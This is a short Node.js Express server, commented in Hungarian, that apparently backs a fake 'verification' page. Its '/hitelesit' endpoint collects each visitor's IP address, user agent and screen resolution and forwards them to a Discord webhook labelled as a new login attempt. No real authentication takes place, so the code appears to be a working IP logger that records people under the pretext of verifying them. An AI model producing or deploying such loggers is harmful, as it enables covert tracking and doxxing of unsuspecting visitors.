const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();

// === CORS BEÁLLÍTÁS (ez a legfontosabb most) ===
const allowedOrigins = [
    'https://hitelesites.netlify.app',
    'http://localhost:3000',
    'http://127.0.0.1:5500',
    // ide később további domaineket tehetsz
];

app.use(cors({
    origin: (origin, callback) => {
        // Engedélyezzük ha nincs origin (pl. mobil app, Postman) vagy ha az origin engedélyezett
        if (!origin || allowedOrigins.includes(origin)) {
            callback(null, true);
        } else {
            callback(new Error('CORS nem engedélyezett'));
        }
    },
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization'],
    credentials: true
}));

app.use(express.json({ limit: '10kb' }));

const WEBHOOK = process.env.DISCORD_WEBHOOK_URL;

if (!WEBHOOK) {
    console.warn('⚠️ DISCORD_WEBHOOK_URL nincs beállítva!');
}

// IP kinyerés
const getClientIP = (req) => {
    return req.headers['x-forwarded-for']?.split(',')[0].trim() ||
           req.socket.remoteAddress ||
           req.ip ||
           'Ismeretlen';
};

app.post('/hitelesit', async (req, res) => {
    try {
        const { ua, res: resolution } = req.body;

        await axios.post(WEBHOOK, {
            embeds: [{
                title: "✅ Új Belépési Kísérlet",
                color: 0x00FF41,
                timestamp: new Date().toISOString(),
                fields: [
                    { name: "IP", value: getClientIP(req), inline: true },
                    { name: "User Agent", value: ua?.substring(0, 500) || "Nincs adat", inline: false },
                    { name: "Képernyő", value: resolution || "Nincs adat", inline: true }
                ]
            }]
        });

        res.status(200).json({ status: "OK" });
    } catch (error) {
        console.error('Webhook hiba:', error.message);
        res.status(500).json({ error: "Szerver hiba" });
    }
});

app.get('/health', (req, res) => res.status(200).json({ status: 'OK' }));

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Szerver fut a ${PORT}-es porton`);
});
